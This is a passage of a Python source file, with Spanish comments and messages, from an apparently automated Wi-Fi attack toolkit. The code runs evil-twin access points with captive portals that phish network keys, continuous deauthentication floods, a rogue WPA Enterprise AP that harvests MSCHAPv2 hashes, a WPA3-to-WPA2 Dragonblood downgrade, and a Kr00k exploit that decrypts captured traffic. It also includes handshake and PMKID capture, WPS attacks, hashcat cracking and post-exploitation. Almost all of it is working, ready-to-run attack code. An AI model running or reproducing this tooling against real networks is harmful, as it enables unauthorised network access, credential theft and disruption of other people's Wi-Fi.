                _f.write("* PEAP,TTLS,TLS,MD5,GTC\n\"t\" TTLS-MSCHAPV2 \"\" [2]\n")

            _wpe_captured = []
            _wpe_stop = _thr.Event()

            def _mon_wpe():
                _seen = set()
                while not _wpe_stop.is_set():
                    for _fp in [_wpe_log, _wpe_creds]:
                        if os.path.exists(_fp):
                            with open(_fp, "r", errors="ignore") as _lf:
                                for _ln in _lf:
                                    _h = hash(_ln.strip())
                                    if _h in _seen or not _ln.strip(): continue
                                    _seen.add(_h)
                                    if any(x in _ln.lower() for x in
                                           ["mschapv2","username","identity","password","credential"]):
                                        _wpe_captured.append(_ln.strip())
                    time.sleep(1)

            _thr.Thread(target=_mon_wpe, daemon=True).start()
            ok(f"AP Enterprise '{essid}' activo. Esperando clientes (120s)...")
            warn("Los hashes MSCHAPv2 aparecerán si hay clientes vulnerables.")

            try:
                subprocess.run([_wpe_tool, _wpe_conf], timeout=120)
            except (KeyboardInterrupt, subprocess.TimeoutExpired):
                pass
            _wpe_stop.set()

            if _wpe_captured:
                ok(f"Credenciales Enterprise capturadas: {len(_wpe_captured)}")
                with open(_wpe_creds, "w") as _f:
                    _f.write("\n".join(_wpe_captured))
                clave  = _wpe_captured[0][:60]
                metodo = "WPA Enterprise MSCHAPv2 hash"
                if check_tool("asleap"):
                    _wl = find_wordlist()
                    if _wl:
                        run(f"asleap -W {_wl} -C {_wpe_creds} 2>/dev/null")
            else:
                warn("Sin credenciales Enterprise capturadas.")

    # ─────────────────────────────────────────────────────────────────────────
    # ── RAMA: WPA3 PURO (Dragonblood downgrade) ───────────────────────────
    # ─────────────────────────────────────────────────────────────────────────
    elif "WPA3" in priv and "WPA2" not in priv:
        step(step_n, "WPA3 puro detectado — Dragonblood downgrade")
        tip("Levantamos un AP WPA2 idéntico para forzar que el cliente haga downgrade.")
        info("Si el cliente acepta WPA2, se conectará a nuestro AP y capturaremos la clave.")

        os.makedirs("/tmp/herradura_wiz_dragon", exist_ok=True)
        _drag_conf = "/tmp/herradura_wiz_dragon/hostapd.conf"
        with open(_drag_conf, "w") as _f:
            _f.write(f"interface={mon_iface}\ndriver=nl80211\nssid={essid}\n"
                     f"hw_mode=g\nchannel={channel}\nwpa=2\n"
                     f"wpa_passphrase=placeholder12345\nwpa_key_mgmt=WPA-PSK\n"
                     f"wpa_pairwise=CCMP\nmacaddr_acl=0\n")

        if check_tool("hostapd"):
            _drag_stop = _thr.Event()
            _drag_twin_res = {"clave": None}

            def _dragon_twin():
                # Levantar AP WPA2 clonado + deauth + portal
                c = _evil_twin_monitor(essid, bssid, channel, mon_iface,
                                       stop_event=_drag_stop, timeout_s=300)
                if c:
                    _drag_twin_res["clave"] = c

            _thr.Thread(target=_dragon_twin, daemon=True).start()

            # Deauth continuo para forzar reconexión al AP falso
            ok(f"AP WPA2 '{essid}' activo (downgrade WPA3→WPA2). Esperando 300s...")
            _drag_deadline = time.time() + 300
            while time.time() < _drag_deadline:
                if _drag_twin_res["clave"]:
                    break
                run(f"aireplay-ng -0 3 -a {bssid} {mon_iface} 2>/dev/null", capture=True)
                time.sleep(10)
            _drag_stop.set()

            if _drag_twin_res["clave"]:
                clave  = _drag_twin_res["clave"]
                metodo = "Dragonblood WPA3 Downgrade + portal"
            else:
                warn("Downgrade WPA3 sin resultado. La red puede estar completamente parcheada.")

            if check_tool("dragonslayer"):
                info("Intentando dragonslayer (timing side-channel)...")
                _ds_out = run(
                    f"timeout 60 dragonslayer -i {mon_iface} -b {bssid} -e {essid} -c {channel} 2>&1",
                    capture=True
                ) or ""
                _ds_m = re.search(r'PSK[:\s]+["\']?([^\s"\']{6,})', _ds_out, re.I)
                if _ds_m and not clave:
                    clave  = _ds_m.group(1)
                    metodo = "Dragonblood timing side-channel"
        else:
            warn("hostapd no disponible para Dragonblood. Continuando con Exploit Engine.")
            # Fallback al exploit engine normal
            _twin_r = {"clave": None}; _twin_s = _thr.Event()
            def _tw_wpa3():
                c = _evil_twin_monitor(essid, bssid, channel, mon_iface,
                                       stop_event=_twin_s, timeout_s=3600)
                if c: _twin_r["clave"] = c
            _thr.Thread(target=_tw_wpa3, daemon=True).start()
            eng = ExploitEngine(essid, bssid, channel, mon_iface, wordlist)
            clave, metodo = smart_exploit_target(eng)
            _twin_s.set()
            if not clave and _twin_r["clave"]:
                clave, metodo = _twin_r["clave"], "Evil Twin portal"

    # ─────────────────────────────────────────────────────────────────────────
    # ── RAMA: WPA / WPA2 / WPA3+WPA2 — Ataque principal ─────────────────
    # ─────────────────────────────────────────────────────────────────────────
    else:
        # ── Evil Twin en background ────────────────────────────────────────
        step(step_n, "Lanzando Evil Twin en background + Exploit Engine")
        print(f"  {DIM}Ambos ataques corren simultáneamente — gana el primero en obtener la clave.{END}\n")

        _twin_result = {"clave": None}
        _twin_stop   = _thr.Event()

        def _twin_worker():
            if check_tool("airbase-ng") and check_tool("dnsmasq"):
                c = _evil_twin_monitor(essid, bssid, channel, mon_iface,
                                       stop_event=_twin_stop, timeout_s=3600)
                if c:
                    _twin_result["clave"] = c
                    _live_results_append(essid, bssid, c, "Evil Twin — portal cautivo")

        _thr.Thread(target=_twin_worker, daemon=True).start()
        if check_tool("airbase-ng"):
            ok(f"Evil Twin activo — AP '{CYAN}{essid}{END}' clonado, deauth continuo")
        print()

        # ── Exploit Engine (10 fases) ──────────────────────────────────────
        eng = ExploitEngine(essid, bssid, channel, mon_iface, wordlist)
        clave, metodo = smart_exploit_target(eng)

        # ── Detener Evil Twin ──────────────────────────────────────────────
        _twin_stop.set()
        _thr.Thread(daemon=True, target=lambda: None).join  # flush
        time.sleep(2)

        if not clave and _twin_result["clave"]:
            clave  = _twin_result["clave"]
            metodo = "Evil Twin — portal cautivo"

        # ── Kr00k (si el AP usa chip Broadcom/Cypress) ─────────────────────
        if not clave:
            _vendor_k = ""
            try:
                _vendor_k = urllib.request.urlopen(
                    f"https://api.macvendors.com/{bssid}", timeout=3
                ).read().decode().strip()
            except Exception:
                pass
            _kr00k_susp = any(k in _vendor_k.upper()
                              for k in ["BROADCOM","CYPRESS","APPLE","AMAZON"])
            if _kr00k_susp and check_tool("airdecap-ng"):
                info(f"Chip {_vendor_k} detectado — intentando Kr00k (CVE-2019-15126)...")
                os.makedirs("kr00k", exist_ok=True)
                _essid_s_k = re.sub(r'[^\w\-]', '_', essid)
                _cap_kr = f"kr00k/wiz_{_essid_s_k}.pcap"
                _cap_kr_p = subprocess.Popen(
                    f"tcpdump -i {mon_iface} -w {_cap_kr} type data 2>/dev/null",
                    shell=True
                )
                time.sleep(2)
                for _ in range(5):
                    run(f"aireplay-ng -0 3 -a {bssid} {mon_iface} 2>/dev/null", capture=True)
                    time.sleep(0.5)
                time.sleep(2)
                _cap_kr_p.terminate()
                _null_k = "00" * 16
                _dec_kr = _cap_kr.replace(".pcap", "-dec.pcap")
                run(f"airdecap-ng -l -b {bssid} -k {_null_k} {_cap_kr} 2>/dev/null", capture=True)
                if os.path.exists(_dec_kr) and os.path.getsize(_dec_kr) > 0:
                    ok(f"Kr00k: frames descifrados con clave nula → {_dec_kr}")
                    if check_tool("tshark"):
                        _kr_data = run(
                            f"tshark -r {_dec_kr} -Y 'http or dns' "
                            f"-T fields -e ip.src -e dns.qry.name "
                            f"-e http.host 2>/dev/null | head -10",
                            capture=True
                        ) or ""
                        if _kr_data.strip():
                            info(f"Tráfico descifrado:{END}\n{CYAN}{_kr_data}{END}")
                    clave  = f"Kr00k OK → {_dec_kr}"
                    metodo = "Kr00k CVE-2019-15126"
                else:
                    info("Kr00k: AP no vulnerable o sin datos en buffer.")

    # ─────────────────────────────────────────────────────────────────────────
    # Detener KARMA background
    # ─────────────────────────────────────────────────────────────────────────
    _karma_stop.set()
    for _kp in _karma_procs:
        try: _kp.terminate()
        except Exception: pass

    print()

    # ── RESULTADO ─────────────────────────────────────────────────────────────
    print("\n" * 3)
    if clave:
        # Beep de alerta
        print('\a', end='', flush=True)
        time.sleep(0.3)
        print('\a', end='', flush=True)
        print(f"""
{GREEN}╔{'═'*60}╗
║{'':^60}║
║{'★★★  CLAVE ENCONTRADA  ★★★':^60}║
║{'':^60}║
╠{'═'*60}╣
║  Red    : {CYAN}{essid[:54]:<54}{GREEN}  ║
║  BSSID  : {WHITE}{bssid:<54}{GREEN}  ║
║  Clave  : {WHITE}{clave[:54]:<54}{GREEN}  ║
║  Método : {DIM}{metodo[:54]:<54}{GREEN}  ║
║{'':^60}║
╚{'═'*60}╝{END}
""")
        aid = db_log_attack("Wizard Completo", essid, bssid, channel, f"crackeada:{clave}")
        db_log_password(aid, essid, bssid, clave, metodo)
        ok("Guardado en historial — usa [29] Ver historial o [30] Reporte HTML.")
    else:
        print(f"""
{RED}╔{'═'*60}╗
║{'':^60}║
║{'✗  SIN RESULTADO — NO SE ENCONTRÓ LA CLAVE  ✗':^60}║
║{'':^60}║
╠{'═'*60}╣
║  Red    : {WHITE}{essid[:54]:<54}{RED}  ║
║  BSSID  : {WHITE}{bssid:<54}{RED}  ║
╠{'═'*60}╣
║  {YELLOW}{'Vectores probados: WPS Pixie, WPS PIN, PMKID, Handshake'[:58]:<58}{RED}  ║
║  {DIM}{'La red tiene contraseña robusta o WPS desactivado.'[:58]:<58}{RED}  ║
║  {DIM}{'Prueba con un diccionario mayor: SecLists / github.com'[:58]:<58}{RED}  ║
║{'':^60}║
╚{'═'*60}╝{END}
""")

    try:
        import termios
        termios.tcflush(sys.stdin, termios.TCIFLUSH)
    except Exception:
        pass
    input(f"\n  {WHITE}[ Presiona Enter para continuar... ]{END}\n")

    # ── POST-EXPLOTACIÓN (si se obtuvo la clave) ──────────────────────────────
    if clave and metodo not in ("Kr00k CVE-2019-15126",):
        separador("POST-EXPLOTACIÓN")
        print(f"  {DIM}Con la clave obtenida puedes conectarte a la red y analizar dispositivos.{END}")
        do_post = ask("¿Ejecutar Post-Explotación ahora? (conectate primero a la red) (s/n)")
        if do_post.lower() == 's':
            # Restaurar red primero para poder conectarse
            run(f"airmon-ng stop {mon_iface} 2>/dev/null")
            run(f"ip link set {mon_iface} down 2>/dev/null; iw dev {mon_iface} set type managed 2>/dev/null; ip link set {mon_iface} up 2>/dev/null")
            run("systemctl start NetworkManager 2>/dev/null; service networking restart 2>/dev/null")
            ok(f"Red restaurada. Conéctate a '{essid}' con la clave: {GREEN}{clave}{END}")
            input(f"\n  {DIM}Conéctate a la red y luego presiona Enter para iniciar post-explotación...{END}")
            post_explotacion()
            return   # post_explotacion ya tiene pause_back al final

    # ── PASO FINAL: Restaurar red ─────────────────────────────────────────────
    sp3 = Spinner("Desactivando modo monitor y restaurando red...")
    sp3.start()
    run(f"airmon-ng stop {mon_iface} 2>/dev/null")
    run(f"ip link set {mon_iface} down 2>/dev/null; iw dev {mon_iface} set type managed 2>/dev/null; ip link set {mon_iface} up 2>/dev/null")
    run("systemctl start NetworkManager 2>/dev/null; service networking restart 2>/dev/null")
    sp3.stop()
    ok("Red restaurada. Ya puedes navegar normalmente.")

    separador("MODO GUIADO COMPLETO")
    gen = ask("¿Generar reporte HTML? (s/n)")
    if gen.lower() == 's':
        generate_report()
    else:
        pause_back()

# ─────────────────────────────────────────────────────────────────────────────
# INTERFAZ
# ─────────────────────────────────────────────────────────────────────────────

def _get_driver(interfaz: str) -> str:
    """Devuelve el nombre del driver del kernel para una interfaz."""
    drv = run(f"readlink /sys/class/net/{interfaz}/device/driver/module 2>/dev/null", capture=True) or ""
    if drv:
        return drv.strip().split("/")[-1]
    # Fallback via ethtool
    drv2 = run(f"ethtool -i {interfaz} 2>/dev/null | grep driver", capture=True) or ""
    m = re.search(r'driver:\s*(\S+)', drv2)
    return m.group(1) if m else ""


def _try_switch_to_8188eu(interfaz: str) -> bool:
    """
    Si el adaptador usa rtl8xxxu (driver in-kernel limitado), intenta cambiarlo
    al driver out-of-tree 8188eu que sí soporta monitor mode real.
    Retorna True si el cambio fue exitoso.
    """
    # Verificar si 8188eu está disponible
    mod_check = run("modinfo 8188eu 2>/dev/null | head -1", capture=True) or ""
    if not mod_check:
        return False

    warn("Driver rtl8xxxu detectado — cambiando a 8188eu para monitor mode real...")
    run(f"ip link set {interfaz} down 2>/dev/null")
    time.sleep(0.3)
    run("rmmod rtl8xxxu 2>/dev/null")
    time.sleep(0.5)
    run("modprobe 8188eu 2>/dev/null")
    time.sleep(1.5)

    # Verificar que la interfaz sigue existente con el nuevo driver
    new_drv = _get_driver(interfaz)
    if "8188eu" in new_drv or "8188" in new_drv:
        ok(f"Driver cambiado a 8188eu en {interfaz}")
        return True
    warn("No se pudo cambiar a 8188eu.")
    return False


def _verify_monitor_captures(interfaz: str, seconds: int = 4) -> bool:
    """
    Verifica que el modo monitor realmente captura frames (prueba real).
    Usa tshark 4s: si recibe algún frame 802.11, retorna True.
    """
    if not shutil.which("tshark"):
        return True  # Sin tshark, asumir OK
    out = run(
        f"timeout {seconds} tshark -i {interfaz} -a duration:{seconds} "
        f"-Y 'wlan' -c 5 -q 2>/dev/null | head -3",
        capture=True
    ) or ""
    # tshark imprime "N packets captured" al final
    m = re.search(r'(\d+) packets? captured', out)
    if m and int(m.group(1)) > 0:
        return True
    # También verificar si simplemente hay líneas de frames
    lines = [l for l in out.strip().splitlines() if l.strip() and not l.startswith("Running")]
    return len(lines) > 0


def _enable_monitor(interfaz: str) -> str:
    """
    Activa modo monitor con múltiples métodos (airmon-ng, iw, ip link).
    Compatible con TP-Link, Alfa, Ralink, Realtek, etc.
    Retorna el nombre de la interfaz en modo monitor.
    """
    # 1) Liberar bloqueos de rfkill (frecuente en TP-Link USB)
    run("rfkill unblock all 2>/dev/null")
    time.sleep(0.5)

    # 2) Detectar driver problemático rtl8xxxu y cambiar a 8188eu si es posible
    driver = _get_driver(interfaz)
    if "rtl8xxxu" in driver:
        _try_switch_to_8188eu(interfaz)

    # 3) Matar procesos que interfieren
    run("airmon-ng check kill 2>/dev/null")
    time.sleep(1)

    # 4) Intentar con airmon-ng (método principal)
    out = run(f"airmon-ng start {interfaz} 2>&1", capture=True) or ""

    # Detectar nuevo nombre de la interfaz monitor
    mon = None
    m = re.search(r'monitor mode (?:enabled|vif enabled) (?:on|for) (\w+)', out, re.I)
    if m:
        mon = m.group(1)
    if not mon:
        m2 = re.search(r'\((\w+)\)', out)
        if m2: mon = m2.group(1)

    # Verificar que realmente existe en modo monitor
    all_ifaces = get_interfaces()
    if mon and mon in all_ifaces:
        mode_chk = run(f"iw dev {mon} info 2>/dev/null | grep type", capture=True) or ""
        if "monitor" in mode_chk:
            return mon

    # Buscar cualquier interfaz monitor existente
    for iface in all_ifaces:
        mode_chk = run(f"iw dev {iface} info 2>/dev/null | grep type", capture=True) or ""
        if "monitor" in mode_chk:
            return iface

    # 5) Fallback: método manual con ip + iw (compatible TP-Link rtl8812au/rtl88x2bu)
    warn("airmon-ng no creó interfaz monitor. Intentando método manual...")
    run(f"ip link set {interfaz} down 2>/dev/null")
    time.sleep(0.3)
    run(f"iw dev {interfaz} set type monitor 2>/dev/null")
    time.sleep(0.3)
    run(f"ip link set {interfaz} up 2>/dev/null")
    time.sleep(0.5)

    mode_chk = run(f"iw dev {interfaz} info 2>/dev/null | grep type", capture=True) or ""
    if "monitor" in mode_chk:
        ok(f"Modo monitor manual activo en: {CYAN}{interfaz}{END}")
        return interfaz

    # 6) Último intento: iwconfig
    run(f"ifconfig {interfaz} down 2>/dev/null")
    run(f"iwconfig {interfaz} mode monitor 2>/dev/null")
    run(f"ifconfig {interfaz} up 2>/dev/null")
    time.sleep(0.5)
    mode_chk = run(f"iwconfig {interfaz} 2>/dev/null", capture=True) or ""
    if "Monitor" in mode_chk:
        ok(f"Modo monitor (iwconfig) activo en: {CYAN}{interfaz}{END}")
        return interfaz

    error("No se pudo activar modo monitor.")
    tip("Para TP-Link TL-WN722N v2/v3: instala el driver out-of-tree")
    tip("  sudo apt install dkms build-essential linux-headers-$(uname -r)")
    tip("  git clone https://github.com/aircrack-ng/rtl8188eus /tmp/rtl8188eus")
    tip("  cd /tmp/rtl8188eus && sudo make && sudo make install")
    tip("  sudo rmmod rtl8xxxu && sudo modprobe 8188eu")
    return interfaz


def start_monitor():
    """[1] Iniciar modo monitor (compatible TP-Link, Alfa, Ralink, Realtek)."""
    separador("ACTIVAR MODO MONITOR")
    tip("Permite capturar tráfico WiFi sin estar conectado a ninguna red.")
    interfaz = select_interface()
    sp = Spinner("Activando modo monitor...")
    sp.start()
    mon = _enable_monitor(interfaz)
    sp.stop()
    run(f"iw dev {mon} info 2>/dev/null | grep -E 'type|addr'", capture=False)
    ok(f"Interfaz monitor: {CYAN}{mon}{END}")
    time.sleep(2)

def stop_monitor():
    """[2] Detener modo monitor."""
    separador("DESACTIVAR MODO MONITOR")
    tip("Esto restaura tu adaptador al modo normal para navegar.")
    interfaz = select_interface()
    sp = Spinner("Desactivando modo monitor...")
    sp.start()
    run(f"airmon-ng stop {interfaz}")
    run("systemctl start NetworkManager 2>/dev/null; service networking restart 2>/dev/null")
    sp.stop()
    ok("Modo monitor detenido y red reiniciada.")
    time.sleep(2)

def show_interface():
    """[3] Ver interfaces."""
    separador("INTERFACES DE RED")
    run("iw dev")
    pause_back()

def restart_network():
    """[4] Reiniciar red."""
    separador("REINICIAR RED")
    sp = Spinner("Reiniciando servicios de red...")
    sp.start()
    run("service networking restart 2>/dev/null; systemctl start NetworkManager 2>/dev/null")
    sp.stop()
    ok("Red reiniciada correctamente.")
    time.sleep(2)

# ─────────────────────────────────────────────────────────────────────────────
# ESCANEO
# ─────────────────────────────────────────────────────────────────────────────

def scan_networks():
    """[5] Escanear redes y guardar CSV."""
    separador("ESCANEAR Y GUARDAR")
    tip("Guarda los resultados para usarlos en ataques posteriores (ej: Multi-Deauth).")
    interfaz = select_interface()
    archivo = ask("Nombre del archivo de salida (Enter = 'scan')")
    if not archivo:
        archivo = "scan"
    archivo = re.sub(r'[^\w\-]', '_', archivo)
    os.makedirs("scan-output", exist_ok=True)
    warn("Presione CTRL+C cuando desee detener el escaneo.")
    time.sleep(2)
    try:
        run(f"airodump-ng --write scan-output/{archivo} --output-format csv {interfaz}")
    except KeyboardInterrupt:
        pass
    ok(f"Guardado en: scan-output/{archivo}-01.csv")
    pause_back()

def scan_live():
    """[6] Escaneo en vivo con tabla visual."""
    separador("ESCANEO EN VIVO")
    tip("Muestra todas las redes cercanas con señal, canal y tipo de seguridad.")
    interfaz = select_interface()

    t = ask("Tiempo de escaneo en segundos (recomendado 20)")
    try:
        t = max(5, min(int(t), 120))
    except ValueError:
        t = 20

    info(f"Escaneando durante {t} segundos...")
    redes = quick_scan(interfaz, t)
    if redes:
        print_network_table(redes)
        info(f"Se detectaron {GREEN}{len(redes)}{END} redes.")
        # Mostrar resumen de vulnerabilidades
        wep   = sum(1 for r in redes if "WEP" in r["privacy"].upper())
        abier = sum(1 for r in redes if "OPN" in r["privacy"].upper())
        wps_  = 0  # no disponible en airodump CSV básico
        if wep or abier:
            separador("RESUMEN DE VULNERABILIDADES")
            if abier: warn(f"{abier} redes ABIERTAS (sin contraseña)")
            if wep:   warn(f"{wep} redes con WEP (cifrado obsoleto, muy vulnerable)")
    else:
        warn("No se detectaron redes. ¿Está en modo monitor?")
    pause_back()

def scan_wps():
    """[11] Escanear redes con WPS habilitado."""
    separador("ESCANEO WPS")
    tip("WPS es una función de los routers que tiene vulnerabilidades conocidas.")
    tip("Las redes con WPS permiten ataques más rápidos (Pixie Dust, PIN brute).")
    if not check_tool("wash"):
        error("'wash' no instalado.")
        info("Instale con: sudo apt install reaver")
        pause_back()
        return
    interfaz = select_interface()
    warn("Presione CTRL+C para detener el escaneo.")
    info("Columna 'WPS Locked: No' = objetivo viable para ataque WPS.")
    time.sleep(1)
    run(f"wash -i {interfaz}")
    pause_back()

def vendor_lookup():
    """[16] Vendor/OUI Lookup."""
    separador("BUSCAR FABRICANTE POR MAC")
    tip("Cada dispositivo tiene una MAC que identifica al fabricante.")
    tip("Útil para saber qué tipo de router o dispositivo es el objetivo.")
    mac = ask("Ingrese dirección MAC (ej: AA:BB:CC:DD:EE:FF)")
    if not validate_bssid(mac):
        error("Formato inválido. Use: AA:BB:CC:DD:EE:FF")
        pause_back()
        return

    oui = mac.replace("-", ":").upper()[:8]
    oui_db = {
        "00:00:0C": "Cisco",          "00:1A:2B": "Cisco",
        "C8:3A:35": "Tenda",          "C8:D7:19": "Tenda",
        "50:C7:BF": "TP-Link",        "B0:4E:26": "TP-Link",
        "F4:F2:6D": "TP-Link",        "DC:FE:18": "TP-Link",
        "54:51:1B": "Huawei",         "00:E0:FC": "Huawei",
        "D8:49:2F": "Huawei",         "28:6C:07": "Xiaomi",
        "F4:8B:32": "Xiaomi",         "AC:BC:32": "Apple",
        "3C:15:C2": "Apple",          "F4:42:8F": "Samsung",
        "94:35:0A": "Samsung",        "3C:A9:F4": "Intel",
        "8C:8D:28": "Intel",          "00:26:55": "NETGEAR",
        "20:4E:7F": "NETGEAR",        "C0:3F:0E": "NETGEAR",
        "00:1B:2F": "D-Link",         "00:19:5B": "D-Link",
        "B0:C5:54": "D-Link",         "E8:94:F6": "D-Link",
        "30:B5:C2": "Belkin",         "94:44:52": "Belkin",
        "70:4F:57": "ZTE",            "B4:B3:62": "ZTE",
        "C8:64:C7": "ZTE",            "00:19:CB": "Zyxel",
        "C8:6C:87": "Zyxel",          "18:A6:F7": "Ubiquiti",
        "24:A4:3C": "Ubiquiti",       "44:D9:E7": "Ubiquiti",
        "DC:9F:DB": "Ubiquiti",       "F0:9F:C2": "Ubiquiti",
        "00:0F:66": "Cisco-Linksys",  "00:18:F8": "Cisco-Linksys",
    }

    vendor = oui_db.get(oui)
    if vendor:
        ok(f"OUI: {oui}  →  Fabricante: {CYAN}{vendor}{END}")
    else:
        warn(f"OUI: {oui}  →  No encontrado en base local. Consultando online...")
        try:
            url = f"https://api.macvendors.com/{urllib.parse.quote(oui)}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                v = resp.read().decode().strip()
            ok(f"Fabricante (online): {CYAN}{v}{END}")
        except Exception:
            warn("No se pudo consultar online. Sin conexión o límite de peticiones alcanzado.")

    pause_back()

# ─────────────────────────────────────────────────────────────────────────────
# ATAQUES
# ─────────────────────────────────────────────────────────────────────────────

def capture_handshake():
    """[7] Capturar Handshake WPA/WPA2."""
    separador("CAPTURA DE HANDSHAKE WPA/WPA2")
    print(f"""
  {WHITE}¿Qué es un handshake?{END}
  {DIM}Es el «apretón de manos» cifrado que ocurre cuando un dispositivo
  se conecta al router. Capturarlo nos permite intentar descifrar la clave.{END}
    """)

    interfaz = select_interface()
    bssid, channel, essid = select_target_from_scan(interfaz)
    if not bssid:
        pause_back()
        return

    os.makedirs("handshakes", exist_ok=True)
    essid_safe = re.sub(r'[^\w\-]', '_', essid)
    ruta = f"handshakes/{essid_safe}"

    paquetes = ask("Paquetes deauth para forzar reconexión (recomendado: 15)")
    try:
        paquetes = max(1, min(int(paquetes), 10000))
    except ValueError:
        paquetes = 15

    warn("Se abrirá ventana de captura. Espere hasta ver 'WPA handshake' y ciérrela.")
    time.sleep(2)

    cmd = (
        f"xterm -title 'Captura {essid}' -e "
        f"'airodump-ng -c {channel} --bssid {bssid} -w {ruta} {interfaz}' & "
        f"sleep 8 && "
        f"aireplay-ng -0 {paquetes} -a {bssid} {interfaz}"
    )
    run(cmd)
    time.sleep(4)

    sp = Spinner("Verificando handshake...")
    sp.start()
    time.sleep(2)
    ok_hs, cap_file = verify_handshake(ruta)
    sp.stop()

    if ok_hs:
        ok(f"Handshake capturado: {cap_file}")
        tip("Use la opción [8] para intentar descifrar la clave.")
    else:
        warn(f"No verificado automáticamente: {ruta}-01.cap")
        tip("El archivo puede ser válido. Verifique con: aircrack-ng archivo.cap")

    pause_back()

def crack_password():
    """[8] Descifrar clave."""
    separador("DESCIFRAR CONTRASEÑA")
    print(f"""
  {WHITE}¿Cómo funciona?{END}
  {DIM}Se prueba cada contraseña del diccionario contra el handshake capturado.
  La velocidad depende del hardware: GPU (hashcat) es ~100x más rápido que CPU.{END}
    """)
    print(f"  {WHITE}[1]{END} {GREEN}aircrack-ng{END}  — CPU  (más lento, funciona en todos lados)")
    print(f"  {WHITE}[2]{END} {CYAN}hashcat{END}      — GPU  (más rápido, requiere .hc22000)")
    print(f"  {WHITE}[3]{END} {MAGENTA}hashcat + reglas{END} — GPU + reglas best64 (el más efectivo)\n")

    modo = ask("Seleccione modo")

    if modo == "1":
        ruta = ask("Ruta del archivo .cap")
        if not os.path.exists(ruta):
            error(f"Archivo no encontrado: {ruta}")
            pause_back()
            return
        diccionario = select_wordlist()
        if not diccionario:
            pause_back()
            return
        info("Iniciando crackeo con aircrack-ng...")
        tip("Presione CTRL+C para detener.")
        run(f"aircrack-ng {ruta} -w {diccionario}")

    elif modo in ("2", "3"):
        if not check_tool("hashcat"):
            error("hashcat no instalado.")
            info("Instale: sudo apt install hashcat")
            pause_back()
            return
        ruta = ask("Ruta del .hc22000 (o .cap — se convertirá automáticamente)")
        if not os.path.exists(ruta):
            error(f"Archivo no encontrado: {ruta}")
            pause_back()
            return
        # Auto-convertir .cap → .hc22000 si es necesario
        if ruta.endswith(".cap") and check_tool("hcxpcapngtool"):
            hc = ruta.replace(".cap", ".hc22000")
            sp = Spinner("Convirtiendo .cap → .hc22000...")
            sp.start()
            run(f"hcxpcapngtool -o {hc} {ruta} 2>/dev/null")
            sp.stop()
            if os.path.exists(hc) and os.path.getsize(hc) > 0:
                ruta = hc
                ok(f"Convertido: {hc}")
        diccionario = select_wordlist()
        if not diccionario:
            pause_back()
            return
        reglas_flag = ""
        if modo == "3":
            best64 = next((p for p in [
                "/usr/share/hashcat/rules/best64.rule",
                "/usr/share/doc/hashcat/rules/best64.rule",
            ] if os.path.exists(p)), "")
            reglas_flag = f"-r {best64}" if best64 else ""
            if best64:
                info(f"Usando reglas: {best64}")
            else:
                warn("best64.rule no encontrado. Continuando sin reglas.")
        info("Iniciando hashcat...")
        tip("Presione 's' para ver estado, 'p' para pausar, 'q' para salir.")
        run(f"hashcat -m 22000 {ruta} {diccionario} {reglas_flag} --force --status --status-timer=15")
    else:
        error("Opción inválida.")

    pause_back()

def pmkid_attack():
    """[9] Ataque PMKID."""
    separador("ATAQUE PMKID")
    print(f"""
  {WHITE}¿Qué es PMKID?{END}
  {DIM}Es una técnica moderna que NO requiere esperar a que un dispositivo
  se conecte. El router transmite el hash directamente al hacer un beacon.
  Compatible con la mayoría de routers modernos.{END}
    """)
    for tool in ["hcxdumptool"]:
        if not check_tool(tool):
            error(f"{tool} no instalado.")
            info("Instale: sudo apt install hcxdumptool hcxtools")
            pause_back()
            return

    interfaz = select_interface()
    bssid = ask("BSSID objetivo (Enter = capturar todos en rango)")
    if bssid and not validate_bssid(bssid):
        error("Formato de BSSID inválido.")
        pause_back()
        return

    t = ask("Tiempo de captura en segundos (recomendado: 60)")
    try:
        t = max(15, min(int(t), 600))
    except ValueError:
        t = 60

    os.makedirs("scan-output", exist_ok=True)
    out_file = "scan-output/pmkid_capture.pcapng"
    filter_flag = f"--filterlist_ap={bssid} --filtermode=2" if bssid else ""

    info(f"Capturando PMKID durante {t} segundos...")
    tip("Si ve 'FOUND PMKID' en la terminal, el ataque fue exitoso.")
    time.sleep(1)
    progress_bar(t, "Capturando PMKID")

    try:
        run(f"timeout {t} hcxdumptool -i {interfaz} -o {out_file} {filter_flag} --active_beacon --enable_status=3")
    except KeyboardInterrupt:
        pass

    if not os.path.exists(out_file):
        error("No se generó archivo de captura.")
        pause_back()
        return

    ok(f"Captura guardada: {out_file}")

    hc_file = "scan-output/pmkid_capture.hc22000"
    sp = Spinner("Convirtiendo a formato hashcat...")
    sp.start()
    if check_tool("hcxpcapngtool"):
        run(f"hcxpcapngtool -o {hc_file} {out_file} 2>/dev/null")
    sp.stop()

    if os.path.exists(hc_file) and os.path.getsize(hc_file) > 0:
        # Verificar que contiene al menos un hash PMKID válido (líneas no vacías)
        with open(hc_file, "r", errors="ignore") as _hf:
            _lines = [l.strip() for l in _hf if l.strip()]
        if not _lines:
            warn("El archivo .hc22000 está vacío o sin hashes válidos.")
            warn("El AP puede no enviar PMKID. Intenta capturar handshake con [7].")
            pause_back(); return
        info(f"{len(_lines)} hash(es) PMKID capturado(s).")
        ok(f"Hash listo: {hc_file}")
        crack = ask("¿Iniciar crackeo ahora? (s/n)")
        if crack.lower() == 's':
            diccionario = select_wordlist()
            if diccionario:
                best64 = next((p for p in [
                    "/usr/share/hashcat/rules/best64.rule",
                    "/usr/share/doc/hashcat/rules/best64.rule",
                ] if os.path.exists(p)), "")
                reglas_flag = f"-r {best64}" if best64 else ""
                run(f"hashcat -m 22000 {hc_file} {diccionario} {reglas_flag} --force --status --status-timer=10")
    else:
        warn("No se encontraron hashes PMKID.")
        tip("El AP puede no ser compatible, estar fuera de rango, o requerir más tiempo.")

    pause_back()

def wps_attack():
    """[10] Ataque WPS."""
    separador("ATAQUE WPS")
    print(f"""
  {WHITE}¿Qué es WPS?{END}
  {DIM}Wi-Fi Protected Setup — función del router para conectar sin contraseña.
  Tiene un PIN de 8 dígitos que puede ser atacado por fuerza bruta.
  Pixie Dust es una variante rápida (segundos) en routers vulnerables.{END}
    """)

    interfaz = select_interface()

    # Escaneo WPS primero
    if check_tool("wash"):
        ver_wps = ask("¿Escanear primero redes con WPS habilitado? (s/n)")
        if ver_wps.lower() == 's':
            warn("Escaneando WPS durante 15 segundos... CTRL+C para parar.")
            time.sleep(1)
            try:
                subprocess.run(f"timeout 15 wash -i {interfaz}", shell=True)
            except Exception:
                pass

    bssid, channel, essid = select_target_from_scan(interfaz)
    if not bssid:
        pause_back()
        return

